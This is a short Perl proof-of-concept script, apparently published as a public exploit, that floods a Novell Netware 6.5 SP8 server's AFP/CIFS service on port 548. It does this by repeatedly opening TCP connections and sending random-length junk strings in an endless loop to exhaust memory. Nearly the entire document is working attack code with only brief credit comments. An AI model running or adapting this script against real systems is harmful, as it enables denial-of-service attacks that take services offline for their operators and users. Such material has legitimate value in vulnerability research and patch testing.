#!/usr/bin/perl
#	Novell Netware CIFS And AFP Remote Memory Consumption DoS
#	Platform: Novell Netware 6.5 SP8
#       Found by Francis Provencher for Protek Research Lab's
#	http://protekresearch.blogspot.com/
#       {PRL} Novell Netware CIFS.nlm Remote Memory Consumption Denial of Service
#       Here is a modified version from the script written by the researcher Jeremy Brown
#       http://jbrownsec.blogspot.com/2009/12/writing-code-that-breaks-code.html
#

use IO::Socket;
use String::Random;

$target   = $ARGV[0];
$port     = 548;
$protocol = tcp;
$maxsize  = 666;
$random   = 0;

if((!defined($target) || !defined($port) || !defined($protocol) || !defined($maxsize)))
{
     print "usage: $0 <target> \n";
     exit;
}

while(1)
{
$sock = IO::Socket::INET->new(Proto=>$protocol, PeerHost=>$target, PeerPort=>$port)
        or logit();

$rand   = new String::Random;
$random = $rand->randpattern("." x rand($maxsize)) . "\r\n\r\n";

     $sock->send($random);
     close($sock);
}